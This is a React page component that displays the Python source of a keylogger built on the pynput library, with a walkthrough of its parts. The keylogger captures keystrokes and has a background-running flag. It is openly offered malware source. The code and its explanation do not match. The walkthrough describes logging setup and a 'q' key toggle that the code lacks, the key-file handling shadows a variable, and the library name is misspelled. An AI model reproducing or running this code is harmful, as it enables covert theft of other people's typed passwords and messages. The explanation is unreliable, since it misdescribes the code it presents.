import React, { useState } from 'react';
import './Component.css';

function Keylogger() {
    const [showCodes, setShowCodes] = useState(false);

    const toggleCodes = () => {
    setShowCodes(!showCodes);
    };

    const codeText = `
    from pynput.keyboard import Key, Listener
    import logging
    from cryptography.fernet import Fernet
    import threading

    log_dir = ''
    log_file = ""
    key_file = "key.key"

    background_mode = True

    def generate_key():
        key = Fernet.generate_key()
        with open(key_file, "wb") as key_file:
            key_file.write(key)

    def load_key():
        return open(key_file, "rb").read()

    try:
        key = load_key()
    except FileNotFoundError:
        generate_key()
        key = load_key()
    fernet = Fernet(key)

    def encrypt_log(log):
        encrypted_log = fernet.encrypt(log.encode())
        return encrypted_log

    def on_press(key):
        if not background_mode:
            try:
                logging.info('"{0}"'.format(key))
            except Exception as e:
                pass

    def toggle_background_mode():
        global background_mode
        background_mode = not background_mode

    toggle_thread = threading.Thread(target=toggle_background_mode)
    toggle_thread.daemon = True
    toggle_thread.start()

    with Listener(on_press=on_press) as listener:
        listener.join()
    `;

  return (
    <div>
        <button class="custom-btn btn-12" onClick={toggleCodes}>
            <span>Click!</span><span>Show All Codes</span></button>
        {showCodes && (
            <div>
            <pre>{codeText}</pre>
            </div>
        )}

        <h1>keylogger_py</h1><hr></hr>
        <img src='/keylogger.png'></img><br></br><br></br>
        This code implements a simple keylogger that uses Python's pynput library to log keyboard input.<br></br><br></br>
        This code uses the flag background_mode to control the background execution status. 
        When you press the "q" key, the toggle_background_mode function is called to toggle the background_mode value. 
        The toggle_background_mode function switches the background execution state and runs it in the background using threads.<br></br><br></br>
        Depending on the background running status, you can control saving or not saving logs. This enables or disables background execution only when the user needs it.
        <br></br><br></br><br></br>
        <h3>The main parts of this code are as follows:</h3><br></br>
        <h1>from pinput.keyboard import Key, Listener:</h1><hr></hr><br></br>
        Import the Key and Listener classes from the pinput library. Use them to monitor and log keyboard input.
        <br></br><br></br><br></br>

        <h1>log_dir=':</h1><hr></hr><br></br>
        A variable that specifies the directory in which to store log files. Because it is currently empty, a log file is created in the current working directory.
        <br></br><br></br><br></br>

        <h1>logging.basicConfig(...):</h1><hr></hr><br></br>
        Configure logging settings. This code sets the logging level to DEBUG, sets the log format to the specified format, and specifies the path and file name of the log file.
        <br></br><br></br><br></br>
        
        <h1>defon_press(key):</h1><hr></hr><br></br>
        The on_press function is a function that handles keyboard input events. This function is called from the Listener object. It is responsible for saving the entered key to the log.
        <br></br><br></br><br></br>

        <h1>Listener.join():</h1><hr></hr><br></br>
        Keeps the Listener object working. While monitoring keyboard input, save the key entered to a log file such as test.txt.
        <br></br><br></br><br></br>

        <h1>from pinput.keyboard import Key, Listener:</h1><hr></hr><br></br>
        Import the Key and Listener classes from the pinput library. Use them to monitor and log keyboard input.
        <br></br><br></br><br></br>

        
    </div>
  );
}

export default Keylogger;